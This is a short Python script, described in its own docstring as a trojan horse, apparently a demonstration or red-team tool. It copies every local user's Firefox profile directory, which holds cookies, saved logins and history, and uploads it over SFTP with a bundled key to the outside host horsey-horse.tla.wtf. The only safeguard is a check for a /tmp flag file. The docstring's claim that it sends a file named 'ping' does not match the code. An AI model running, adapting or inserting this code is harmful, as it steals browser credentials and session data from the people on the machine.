import os
import shutil
import subprocess
from datetime import datetime

HOST = "horsey-horse.tla.wtf"


def run_horse():
    """
    Runs our trojan horse script

    Exfiltrates the file "ping" to host
    """
    if not os.path.exists("/tmp/ALLOW-EXFILTRATION"):
        raise Exception("Stopped user from shooting their foot off")
    current_path = os.path.dirname(os.path.realpath(__file__))
    source_path = make_payload()
    key_path = os.path.join(current_path, "horsey.key")
    # Make sure the file is usable for SFTP
    os.chmod(key_path, 0o600)
    proc = subprocess.Popen(
        ["sftp", "-qNri", key_path, f"horse@{HOST}:"],
        stdin=subprocess.PIPE,
    )
    proc.communicate(f"put {source_path}".encode())


def make_payload():
    path = f"/tmp/payload-{datetime.now().timestamp()}"
    os.makedirs(path)
    home_paths = os.listdir("/home")
    for home in home_paths:
        try:
            target_dir = os.path.join(path, home)
            firefox_dir = os.path.join("/home", home, ".mozilla/firefox")
            shutil.copytree(firefox_dir, target_dir)
        except Exception:
            pass
    return path
